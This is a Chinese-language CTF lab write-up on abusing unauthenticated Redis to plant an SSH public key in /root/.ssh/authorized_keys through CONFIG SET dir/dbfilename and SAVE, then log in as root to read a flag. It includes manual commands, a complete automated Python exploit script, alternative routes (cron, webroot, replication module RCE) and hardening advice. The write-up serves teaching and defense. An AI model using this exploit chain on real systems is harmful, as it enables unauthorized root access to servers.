---
title: "玄机：Redis 未授权访问导致远程代码执行（步骤详细补充版）"
date: 2026-05-23T16:22:02+08:00
draft: false
summary: "本文详细介绍了利用Redis未授权访问漏洞获取目标主机权限并读取/root/flag.txt的完整流程。主要内容包括：Redis未授权访问的判断方法、SSH公钥登录原理、手工利用步骤（生成密钥、修改Redis持久化配置、触发保存）以及自动化脚本实现。重点分析了Redis持久化机制如何被用于写入SSH公钥到/root/.ssh/authorized_keys文件，从而通过密钥认证登录root账户。整个过程涉及Redis配置修改、SSH密钥认证机制和Linux文件权限等关键技术点，适用于本地靶场或授权内网环境的"
slug: "xuan-ji-redis-wei-shou-quan-fang-wen-dao-zhi-yuan-cheng-dai-ma-zhi-xing-bu-zou-xiang"
originalId: 161343657
sourceUrl: "https://blog.csdn.net/BEICHENst/article/details/161343657"
categories:
  - "CTF"
tags:
  - "redis"
  - "数据库"
  - "缓存"
  - "ctf"
  - "web安全"
  - "CTF"
  - "网络安全"
featuredImage: "images/cover.png"
---

> 本文是上一篇Redis未授权访问导致远程代码执行的补充版，重点补充完整操作流程、每一步的作用、脚本执行逻辑、如何连接Redis、如何判断失败原因，以及如何最终读取`/root/flag.txt`。

---

### 一、题目背景

题目给出了一个Redis服务地址：

```text
redis://ip:6379
```

题目目标是利用Redis未授权访问进一步获取目标主机权限，并读取：

```text
/root/flag.txt
```

本题的典型利用链是：

```text
Redis未授权访问
    ↓
利用Redis持久化机制写文件
    ↓
写入/root/.ssh/authorized_keys
    ↓
通过SSH私钥登录root用户
    ↓
读取/root/flag.txt
```

这道题的核心不是单纯连接Redis，而是理解Redis为什么能被用来写文件，以及为什么写入SSH 公钥 后可以登录目标服务器。

---

### 二、考点分析

本题主要考察以下几个知识点：

```text
1. Redis未授权访问判断
2. Redis RESP协议基础
3. Redis持久化机制
4. CONFIG SET dir / dbfilename的作用
5. SSH密钥登录机制
6. authorized_keys文件作用
7. Linux文件权限与Redis进程权限
8. flag文件读取方式
```

其中最关键的是：

Redis本身不能直接执行系统命令，但可以通过持久化功能写文件。如果Redis进程权限足够高，就可以把文件写到/root/.ssh/authorized_keys。一旦authorized_keys中存在我们的公钥，就可以用对应私钥登录root。

---

### 三、连接Redis

#### 1\. 安装 redis-cli

如果在 Linux 或WSL中操作，可以先安装Redis客户端工具：

```bash
sudo apt update
sudo apt install redis-tools -y
```

检查是否安装成功：

```bash
redis-cli --version
```

---

#### 2\. 连接Redis服务

题目给出的地址类似：

```text
redis://ip:6379
```

使用`redis-cli`连接：

```bash
redis-cli -h ip -p 6379
```

如果是本地靶场：

```bash
redis-cli -h 127.0.0.1 -p 6379
```

如果是 Docker 靶场，需要先确认容器IP：

```bash
docker inspect 容器名 | grep IPAddress
```

然后连接：

```bash
redis-cli -h 172.17.0.2 -p 6379
```

---

#### 3\. 测试未授权访问

进入Redis交互模式后执行：

```redis
PING
```

如果返回：

```text
PONG
```

说明Redis不需要认证，可以直接操作，也就是存在未授权访问。

如果返回：

```text
NOAUTH Authentication required.
```

说明Redis需要密码，本题这条利用链无法直接继续。

---

### 四、读取Redis基础信息

确认未授权之后，不要急着写文件，先查看Redis基本配置：

```redis
INFO
CONFIG GET dir
CONFIG GET dbfilename
CONFIG GET protected-mode
CONFIG GET requirepass
```

重点关注：

```text
dir              Redis当前持久化保存目录
dbfilename       Redis当前RDB保存文件名
protected-mode   是否开启保护模式
requirepass      是否设置密码
role             Redis角色，常见为master
```

例如：

```redis
CONFIG GET dir
```

可能返回：

```text
1) "dir"
2) "/var/lib/redis"
```

说明Redis默认把RDB文件保存在`/var/lib/redis`目录。

查看RDB 文件名 ：

```redis
CONFIG GET dbfilename
```

可能返回：

```text
1) "dbfilename"
2) "dump.rdb"
```

正常情况下，Redis会把内存数据保存成：

```text
/var/lib/redis/dump.rdb
```

而我们的目标是让Redis保存成：

```text
/root/.ssh/authorized_keys
```

所以后面需要修改：

```text
dir = /root/.ssh/
dbfilename = authorized_keys
```

---

### 五、SSH公钥登录原理

SSH 密钥 登录依赖一对密钥：

```text
私钥：保存在攻击机本地
公钥：写入目标服务器authorized_keys文件
```

对于root用户来说，SSH公钥认证文件是：

```text
/root/.ssh/authorized_keys
```

如果这个文件里有我们的公钥，那么就可以使用对应的 私钥 登录：

```bash
ssh -i 私钥 root@目标IP
```

因此，本题的目标就变成了：

```text
想办法把自己的SSH公钥写入目标服务器的/root/.ssh/authorized_keys
```

Redis的持久化功能刚好可以完成这个写文件动作。

---

### 六、手工利用流程

#### 1\. 本地生成SSH密钥

在攻击机上生成一对临时密钥：

```bash
ssh-keygen -t ed25519 -f ./redis_id_ed25519 -N ""
```

生成后会得到两个文件：

```text
redis_id_ed25519       私钥
redis_id_ed25519.pub   公钥
```

查看公钥内容：

```bash
cat redis_id_ed25519.pub
```

公钥内容类似：

```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxx user@host
```

---

#### 2\. 把公钥写入Redis键值

连接Redis：

```bash
redis-cli -h ip -p 6379
```

写入公钥时，建议在前后加空行，降低RDB文件脏数据对SSH解析的影响：

```redis
SET ssh_key "\n\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxxxxxxxxxx user@host\n\n"
```

这一步只是把公钥写入Redis内存，还没有写入目标 服务器 文件系统。

---

#### 3\. 修改Redis持久化目录

执行：

```redis
CONFIG SET dir /root/.ssh/
```

这一步的作用是告诉Redis：

之后保存RDB文件时，把文件保存到/root/.ssh/目录。

如果返回：

```text
OK
```

说明Redis进程有权限进入并写入这个目录。

如果返回：

```text
Permission denied
```

说明Redis权限不足，SSH写入路线失败。

如果返回：

```text
No such file or directory
```

说明目标上可能不存在`/root/.ssh/`目录。

---

#### 4\. 修改RDB文件名

执行：

```redis
CONFIG SET dbfilename authorized_keys
```

这一步的作用是告诉Redis：

保存出来的文件名叫authorized_keys。

结合上一步，Redis最终保存路径就变成：

```text
/root/.ssh/authorized_keys
```

---

#### 5\. 触发持久化保存

执行：

```redis
SAVE
```

如果返回：

```text
OK
```

说明Redis已经把当前数据库内容保存到了：

```text
/root/.ssh/authorized_keys
```

此时目标root用户的SSH公钥认证文件中已经包含我们的公钥。

---

#### 6\. 使用私钥登录目标

退出Redis后，在本地执行：

```bash
chmod 600 ./redis_id_ed25519
ssh -i ./redis_id_ed25519 root@ip
```

如果登录成功，说明SSH公钥写入成功。

---

#### 7\. 读取flag

登录后执行：

```bash
cat /root/flag.txt
```

即可得到flag。

也可以不进入交互式shell，直接执行：

```bash
ssh -i ./redis_id_ed25519 root@ip "cat /root/flag.txt"
```

---

### 七、完整解题脚本

下面的脚本会自动完成：

1. 检查目标是否为本地或私有网段
2. 连接Redis
3. 发送PING确认未授权
4. 自动生成SSH密钥对
5. 将公钥写入Redis
6. 修改Redis保存目录为/root/.ssh/
7. 修改RDB文件名为authorized_keys
8. 触发SAVE保存
9. 使用私钥SSH登录并读取/root/flag.txt

脚本仅允许本地或私有网段地址，避免误操作公网目标。

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import socket
import ipaddress
import subprocess
import tempfile
from pathlib import Path

REDIS_PORT = 6379
SSH_PORT = 22
TIMEOUT = 5

def is_private_or_local(host: str) -> bool:
    try:
        ip = socket.gethostbyname(host)
        addr = ipaddress.ip_address(ip)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except Exception:
        return False

def resp_command(*args) -> bytes:
    payload = f"*{len(args)}\r\n".encode()
    for arg in args:
        if isinstance(arg, str):
            arg = arg.encode()
        payload += b"$" + str(len(arg)).encode() + b"\r\n" + arg + b"\r\n"
    return payload

def recv_all(sock: socket.socket) -> str:
    sock.settimeout(TIMEOUT)
    data = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data.decode(errors="ignore")

def redis_cmd(sock: socket.socket, *args) -> str:
    sock.sendall(resp_command(*args))
    return recv_all(sock)

def check_redis_unauth(sock: socket.socket) -> bool:
    res = redis_cmd(sock, "PING")
    print("[*] PING =>", res.strip())

    if "PONG" in res:
        print("[+] Redis未授权访问成立")
        return True

    if "NOAUTH" in res.upper():
        print("[-] Redis需要认证，无法继续")
        return False

    print("[-] Redis返回异常，无法确认未授权")
    return False

def generate_ssh_key() -> tuple[str, str]:
    tmpdir = tempfile.mkdtemp(prefix="redis_ssh_")
    key_path = os.path.join(tmpdir, "id_ed25519")

    subprocess.check_call([
        "ssh-keygen",
        "-t", "ed25519",
        "-f", key_path,
        "-N", "",
        "-q"
    ])

    private_key = key_path
    public_key = key_path + ".pub"

    print(f"[+] 私钥: {private_key}")
    print(f"[+] 公钥: {public_key}")

    return private_key, public_key

def write_ssh_key(sock: socket.socket, public_key_path: str) -> bool:
    pubkey = Path(public_key_path).read_text().strip()

    payload = f"\n\n{pubkey}\n\n"

    print("[*] 写入Redis键值")
    res = redis_cmd(sock, "SET", "ssh_key", payload)
    print(res.strip())

    print("[*] 修改Redis持久化目录为 /root/.ssh/")
    res = redis_cmd(sock, "CONFIG", "SET", "dir", "/root/.ssh/")
    print(res.strip())

    if "OK" not in res:
        print("[-] 修改dir失败，可能Redis无权限写/root/.ssh/")
        return False

    print("[*] 修改dbfilename为 authorized_keys")
    res = redis_cmd(sock, "CONFIG", "SET", "dbfilename", "authorized_keys")
    print(res.strip())

    if "OK" not in res:
        print("[-] 修改dbfilename失败")
        return False

    print("[*] 触发SAVE写入authorized_keys")
    res = redis_cmd(sock, "SAVE")
    print(res.strip())

    if "OK" not in res:
        print("[-] SAVE失败")
        return False

    print("[+] SSH公钥写入完成")
    return True

def ssh_read_flag(host: str, private_key: str):
    print("[*] 尝试SSH读取 /root/flag.txt")

    cmd = [
        "ssh",
        "-i", private_key,
        "-p", str(SSH_PORT),
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "BatchMode=yes",
        "-o", "ConnectTimeout=5",
        f"root@{host}",
        "cat /root/flag.txt"
    ]

    try:
        result = subprocess.run(
            cmd,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=15
        )

        print("\n========== FLAG RESULT ==========")
        if result.stdout.strip():
            print(result.stdout.strip())
        else:
            print("[-] 未读到flag")
            print(result.stderr.strip())
        print("=================================")

    except Exception as e:
        print(f"[-] SSH执行失败: {e}")

def main():
    if len(sys.argv) < 2:
        print(f"用法: python3 {sys.argv[0]} 127.0.0.1")
        print(f"示例: python3 {sys.argv[0]} 192.168.56.101")
        sys.exit(1)

    host = sys.argv[1]

    if not is_private_or_local(host):
        print("[-] 为避免误打公网目标，脚本只允许本地/私有网段地址。")
        print("[-] 允许范围：127.0.0.1、10.0.0.0/8、172.16.0.0/12、192.168.0.0/16")
        sys.exit(1)

    print(f"[*] Target Redis: {host}:{REDIS_PORT}")

    try:
        sock = socket.create_connection((host, REDIS_PORT), timeout=TIMEOUT)
    except Exception as e:
        print(f"[-] Redis连接失败: {e}")
        sys.exit(1)

    try:
        if not check_redis_unauth(sock):
            return

        private_key, public_key = generate_ssh_key()

        ok = write_ssh_key(sock, public_key)

        if not ok:
            print("[-] SSH写入路线失败")
            print("[*] 可能原因：")
            print("    1. Redis不是root权限运行")
            print("    2. /root/.ssh/目录不存在")
            print("    3. CONFIG命令被禁用")
            print("    4. SAVE命令被禁用")
            return

        ssh_read_flag(host, private_key)

    finally:
        sock.close()

if __name__ == "__main__":
    main()
```

保存为：

```bash
redis_ssh_flag.py
```

运行：

```bash
python3 redis_ssh_flag.py 127.0.0.1
```

如果是Docker靶场：

```bash
python3 redis_ssh_flag.py 172.17.0.2
```

---

### 八、脚本逐步解释

#### 1\. 检查目标是否为私有地址

```python
def is_private_or_local(host: str) -> bool:
```

这个函数用于判断目标是不是：

```text
127.0.0.1
10.0.0.0/8
172.16.0.0/12
192.168.0.0/16
```

这样可以避免误操作公网目标。

---

#### 2\. 构造Redis 协议

```python
def resp_command(*args) -> bytes:
```

Redis使用RESP协议通信。

例如：

```redis
PING
```

实际发送给Redis的数据是：

```text
*1\r\n$4\r\nPING\r\n
```

脚本通过`resp_command`函数自动把普通命令转换成Redis能识别的协议格式。

---

#### 3\. 检测未授权访问

```python
def check_redis_unauth(sock: socket.socket) -> bool:
```

脚本发送：

```redis
PING
```

如果返回：

```text
PONG
```

说明Redis未授权访问成立。

---

#### 4\. 自动生成SSH密钥

```python
def generate_ssh_key() -> tuple[str, str]:
```

脚本调用：

```bash
ssh-keygen -t ed25519
```

自动生成一对临时密钥：

```text
id_ed25519       私钥
id_ed25519.pub   公钥
```

公钥用于写入目标服务器，私钥用于后续SSH登录。

---

#### 5\. 将公钥写入Redis

```python
res = redis_cmd(sock, "SET", "ssh_key", payload)
```

这一步相当于执行：

```redis
SET ssh_key "公钥内容"
```

此时公钥只在Redis内存里。

---

#### 6\. 修改Redis保存目录

```python
CONFIG SET dir /root/.ssh/
```

这一步决定文件保存位置。

如果成功，说明Redis有权限写入`/root/.ssh/`目录。

如果失败，说明SSH写公钥路线不可行。

---

#### 7\. 修改保存文件名

```python
CONFIG SET dbfilename authorized_keys
```

这一步决定保存文件名。

结合上一步，最终保存路径为：

```text
/root/.ssh/authorized_keys
```

---

#### 8\. 触发保存

```python
SAVE
```

Redis把内存中的键值数据保存到磁盘。

最终结果是：

```text
/root/.ssh/authorized_keys
```

中包含我们的SSH公钥。

---

#### 9\. SSH登录读取flag

```python
ssh -i 私钥 root@ip "cat /root/flag.txt"
```

如果公钥写入成功，SSH会认为我们拥有root用户授权，可以直接执行命令读取flag。

---

### 九、常见失败原因

#### 1\. Redis连接失败

表现：

```text
Redis连接失败
```

可能原因：

1. Redis没有启动
2. IP或端口错误
3. Docker端口没有映射
4. 防火墙拦截
5. 靶场环境未启动

排查：

```bash
redis-cli -h ip -p 6379 ping
```

---

#### 2\. PING不返回PONG

如果返回：

```text
NOAUTH Authentication required
```

说明Redis配置了密码，本题未授权路线不成立。

---

#### 3\. CONFIG SET dir失败

表现：

```text
Permission denied
```

可能原因：

```text
1. Redis不是root权限运行
2. Redis无权限写/root/.ssh/
3. /root/.ssh/目录不存在
4. Redis开启了保护配置
```

这时SSH写入路线失败，可以考虑：

1. 尝试其他可写目录
2. 尝试cron写入
3. 尝试Web目录写入
4. 尝试Redis主从复制模块利用

---

#### 4\. SAVE失败

可能原因：

1. SAVE命令被禁用
2. 持久化目录不可写
3. 当前Redis配置不允许保存
4. 磁盘权限不足

---

#### 5\. SSH登录失败

可能原因：

1. 目标没有开放22端口
2. 目标没有运行sshd
3. root用户禁止SSH登录
4. authorized_keys格式被RDB脏数据影响
5. /root/.ssh/目录权限不符合SSH要求
6. 私钥权限过宽，没有chmod 600

本地可以先执行：

```bash
chmod 600 redis_id_ed25519
```

然后再登录。

---

### 十、为什么有时候写入了authorized\_keys仍然不能登录

Redis保存的RDB文件不是纯文本文件，它会包含一些二进制数据。我们写进去的公钥只是其中一部分。

所以`authorized_keys`最终可能长这样：

```text
REDIS0009...二进制脏数据...
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxx user@host
...二进制脏数据...
```

SSH解析`authorized_keys`时，只要能识别其中合法的一行公钥，就有可能登录成功。

因此写入公钥时通常会在前后加换行：

```text

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIxxxxxxxxxxxx user@host
```

这样可以提高SSH正确识别公钥的概率。

---

### 十一、完整解题逻辑总结

本题完整思路如下：

```redis
拿到Redis地址
    ↓
redis-cli连接6379端口
    ↓
执行PING
    ↓
返回PONG，确认未授权
    ↓
查看CONFIG GET dir和dbfilename
    ↓
本地生成SSH密钥对
    ↓
将公钥写入Redis键值
    ↓
CONFIG SET dir /root/.ssh/
    ↓
CONFIG SET dbfilename authorized_keys
    ↓
SAVE触发持久化
    ↓
使用私钥SSH登录root
    ↓
cat /root/flag.txt
    ↓
获得flag
```

---

### 十二、博客总结

本题是一个典型的Redis未授权访问利用题。Redis未授权访问本身只是入口，真正完成权限获取的是Redis的持久化写文件能力。通过控制Redis的保存目录和保存文件名，可以把我们写入Redis内存中的SSH公钥保存到目标服务器的`/root/.ssh/authorized_keys`文件中。随后使用对应私钥即可通过SSH登录root用户，并读取`/root/flag.txt`。

这条利用链成立需要满足几个条件：

1. Redis未授权访问成立
2. CONFIG SET命令可用
3. Redis进程有权限写入/root/.ssh/
4. SAVE命令可用
5. 目标机器运行SSH服务
6. root允许通过密钥登录

如果其中任意一个条件不满足，SSH写入路线都可能失败。此时需要根据实际环境转向其他利用方式，例如cron写入、Web目录写入或Redis主从复制模块RCE。

一句话总结：

Redis未授权不是直接getshell，而是利用Redis持久化写文件能力，把SSH公钥写进root的authorized_keys，再用私钥登录读取flag。

---

### 十三、修复建议

实际生产环境中应避免Redis暴露在公网，并进行以下加固：

1. Redis只监听127.0.0.1或内网地址
2. 开启protected-mode
3. 配置强密码或ACL认证
4. 防火墙限制6379端口访问来源
5. Redis不要以root权限运行
6. 禁用或重命名CONFIG、SAVE、SLAVEOF、REPLICAOF、MODULE等危险命令
7. 定期检查/root/.ssh/authorized_keys是否被异常修改
8. 检查Redis数据目录是否存在异常RDB文件

Redis配置示例：

```conf
bind 127.0.0.1
protected-mode yes
requirepass StrongPasswordHere
```

也可以限制危险命令：

```conf
rename-command CONFIG ""
rename-command SAVE ""
rename-command BGSAVE ""
rename-command SLAVEOF ""
rename-command REPLICAOF ""
rename-command MODULE ""
```
